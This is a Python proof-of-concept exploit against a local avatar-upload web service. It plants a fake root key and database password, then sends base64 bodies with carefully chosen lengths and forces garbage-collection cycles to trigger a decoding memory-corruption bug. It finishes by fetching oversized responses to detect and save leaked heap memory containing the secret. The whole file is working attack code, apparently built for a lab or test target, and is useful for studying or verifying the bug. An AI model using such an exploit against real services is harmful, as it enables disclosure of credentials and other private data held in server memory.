import json, re, sys, time, urllib.request, urllib.error, base64 as b64
BASE = "http://127.0.0.1:8080"
GCLOG = "/share/gc.log"
CYCLE = re.compile(r"Concurrent Mark Cycle .*ms")
MB = 1048576

def req(method, path, data=None, timeout=180):
    r = urllib.request.Request(BASE + path, data=data, method=method,
        headers={"X-User": "demo", "Content-Type": "application/octet-stream"})
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers)
    except Exception as e:
        return -1, str(e).encode(), {}

def diag():
    c, b, _ = req("GET", "/api/diag", timeout=15)
    try: return json.loads(b.decode())
    except Exception: return {}

def cycles():
    try: return len(CYCLE.findall(open(GCLOG, errors="ignore").read()))
    except OSError: return -1

def alive():
    return req("GET", "/api/status", timeout=5)[0] == 200

def main():
    variant = sys.argv[1]  # n6 | n7
    warm_first = "--warm" in sys.argv
    if variant == "n6":
        fill_m, trig_k = 2097133, 2097136     # filler decoded 6291400 (6R), trig 6291409 (6R), slack 31
    else:
        fill_m, trig_k = 2446666, 2446656     # filler decoded 7339999 (7R), trig 7339969 (7R), slack 47
    # RAW b64 TEXT — the server decodes this ONCE (double-encoding bug fixed)
    fill_body = (b"A" * (4 * fill_m)) + b"AB"
    trig_body = (b"A" * (4 * trig_k)) + b"=="

    if warm_first:
        shapes = [b"QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=", b"A"*4096+b"AB",
                  b"A"*4096+b"ABC", b"A"*4096+b"AB=="]
        print("[W] warm 20K...", flush=True)
        for i in range(20000):
            c, _, h = req("POST", "/api/avatar?id=warm", b64.b64encode(shapes[i & 3]))
            if c == 201: req("DELETE", "/api/avatar?id=warm")
        print("[W] done", flush=True)

    d0 = diag()
    if sum(1 for k in (d0 or {}) if k.startswith("f")) < 100:
        print("[init] filling inventory (%s)..." % variant, flush=True)
        secret = (b"CLASSIFIED-ROOT-KEY=A7f3c9e1d2b8a6405f7c2e91d4b6a830 "
                  b"DB-PASSWORD=hunter2-special-session ")
        cred = b64.b64encode(secret + b"X" * (fill_m * 3 - len(secret)))
        for i in list(range(0, 69)) + list(range(71, 100)):
            c, _, _ = req("POST", "/api/avatar?id=f%d" % i, fill_body)
            if c != 200:
                print("[init] fill f%d FAILED %s" % (i, c), flush=True); sys.exit(2)
        req("POST", "/api/avatar?id=cred", cred)
        print("[init] done:", req("GET", "/api/status")[1].decode().strip(), flush=True)

    req("DELETE", "/api/avatar?id=f69")
    print("[D] dropped f69", flush=True)
    c0 = cycles()
    for _ in range(90):
        req("POST", "/api/pump?mb=64")
        time.sleep(2)
        if cycles() > c0:
            break
    print("[C] cycles %d -> %d" % (c0, cycles()), flush=True)

    fired = 0
    for t in range(150):
        c, body, _ = req("POST", "/api/avatar?id=trig_%s" % variant, trig_body, timeout=60)
        fired += 1
        if t % 25 == 0:
            print("[T] trigger %d -> HTTP %s" % (t, c), flush=True)
        if not alive():
            print("VERDICT: CRASH after %d triggers" % fired); sys.exit(42)
        if t in (49, 99):
            req("POST", "/api/pump?mb=64")
    print("[T] %d triggers fired" % fired, flush=True)

    d1 = diag()
    anomalies = []
    for k, v in sorted((d1 or {}).items()):
        if k == "cred" and v != fill_m * 3:
            anomalies.append((k, v))
        if k.startswith("trig") and v != 3 * trig_k + 1:
            anomalies.append((k, v))
        if k.startswith("f") and not k.startswith("f9") and v != fill_m * 3 + 1 and k != drop_neighbor_ok(k):
            anomalies.append((k, v))
    print("[D] anomalous lengths:", anomalies if anomalies else "none", flush=True)

    disclosed = False
    for k, v in anomalies:
        if 0 < v:
            c, data, _ = req("GET", "/api/avatar?id=" + k, timeout=120)
            got = len(data)
            print("[P] GET %s: %d bytes (diag says %d)" % (k, got, v), flush=True)
            if got > v + 4096 or (got > len(data) and got > 5 * MB):
                m = data.find(b"CLASSIFIED-ROOT-KEY")
                print("[P] DISCLOSED +%d; marker at %s" % (got - v, m), flush=True)
                if m >= 0:
                    print("[P] SECRET: " + data[m:m+64].decode("latin-1", "replace"), flush=True)
                open("/tmp/disclosure_%s_%s.bin" % (variant, k), "wb").write(data)
                disclosed = True
    print("VERDICT: " + ("DISCLOSED" if disclosed else ("CORRUPTION-SEEN" if anomalies else "CLEAN")), flush=True)

def drop_neighbor_ok(k):
    return False

if __name__ == "__main__":
    main()
